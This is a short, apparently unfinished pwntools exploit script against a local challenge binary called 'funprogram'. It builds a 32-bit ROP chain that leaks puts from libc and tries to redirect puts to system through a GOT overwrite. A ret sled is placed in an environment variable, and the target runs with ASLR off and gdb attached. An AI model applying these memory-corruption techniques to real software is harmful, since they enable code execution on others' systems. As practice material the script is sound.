from pwn import *

context.clear(arch="i386", kernel="amd64")

e = ELF("./funprogram")
libc = ELF("/lib32/libc.so.6")

r = ROP(e)

STACK_MEMORY_GUESS = 0xFFFDE3D0

# libc leak
r.raw(e.symbols["puts"])  # function call (puts)
r.raw(0x08049022)  # return address of puts (pop ebx ; ret)
r.raw(e.got["puts"])  # arg0 to puts

# puts -> system
r.raw(e.symbols["fgets"])  # function call (fgets)
r.raw(0x08049291)  # return address of fgets (pop esi ; pop edi ; pop ebp ; ret)
r.raw(e.got["puts"])  # arg0 to fgets (buffer)
r.raw(0x01010101)  # arg1 to fgets (amount of bytes)
r.raw(
    e.symbols["stdin"]
)  # arg2 to fgets (stream) <-- ISSUE: the real stdin address is in libc

# # trigger main again
r.raw(0x08049293)  # pop ebp ; ret
r.raw(STACK_MEMORY_GUESS)  # make sure ebp is writeable memory
r.raw(0x080491F5)  # Note: we will start after stdin is pushed cause EBX is cooked
r.raw(e.symbols["stdin"])  # stdin should have just been pushed

# print("got puts", hex(e.got["puts"]))
# print("stdin ptr", hex(e.symbols["stdin"]))

ret_sled = p32(0x0804900E) * (1024 // 4) * 127
payload = ret_sled + r.chain()

c = process(e.path, env={"AAAA": payload}, aslr=False)

context.terminal = ["tmux", "splitw", "-h"]
gdb.attach(
    c,
    """
b main
continue
""".strip(),
)

c.recvuntil(b"Enter an integer:\n")
c.sendline(b"AAAA" + p32(STACK_MEMORY_GUESS + 4))
print(c.recvline())
print(c.recvline())

puts_addr = u32(c.recvline()[:4])

system_addr = puts_addr + (libc.symbols["system"] - libc.symbols["puts"])

c.interactive()
